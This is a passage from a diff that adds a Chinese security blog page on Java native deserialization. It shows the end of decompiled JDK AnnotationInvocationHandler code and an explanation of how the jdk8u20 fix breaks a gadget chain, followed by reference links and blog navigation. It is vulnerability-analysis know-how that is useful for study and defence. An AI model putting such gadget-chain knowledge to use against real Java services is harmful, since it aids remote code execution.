ExceptionProxy)) &#123;</span><br><span class="line">                var11 = (<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var11.getClass() + <span class="string">&quot;[&quot;</span> + var11 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var5.members().get(var10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="built_in">this</span>, var3); <span class="comment">//这里才赋值</span></span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="built_in">this</span>, var7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>jdk8u20的修复方式比较绝，直接没有defaultReadObject，也就是说在调用AnnotationType.getInstance(var3)前，AnnotationInvocationHandler是完全没有恢复的，所以他的成员变量值啥的自然都是null。正常情况下，经过类型检查后，在最后的两句话中才设置上type和memberValues这两个变量。而我们调用链的情况是从var5 &#x3D; AnnotationType.getInstance(var3);抛异常出来后就会返回上级了，没法调用到后面的两句话，所以type和memberValues都是null，后续的链子在调用type.getDeclaredMethod时就会爆错。</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/974.html">https://www.cnpanda.net/sec/974.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/176672.html">https://www.freebuf.com/vuls/176672.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.diggid.fun/2021/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Jdk7u21-Jdk8u20-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://blog.diggid.fun/2021/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Jdk7u21-Jdk8u20-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/07/%E5%8E%9F%E7%94%9FJDK%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cm5l7vlhu000cfscx8xar5bu5" data-title="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\原生JDK反序列化" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/01/07/shiro%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\shiro漏洞合集
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a></li></ul></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" rel="tag">注入漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Java安全</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 15px;">反序列化</a> <a href="/tags/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">注入漏洞</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" style="font-size: 20px;">漏洞分析</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/01/07/hello-world/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\hello-world</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/07/CC%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\CC链反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/07/CB%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\CB链反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/07/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Hessian反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/07/JNDI%E6%B3%A8%E5%85%A5/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\JNDI注入</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
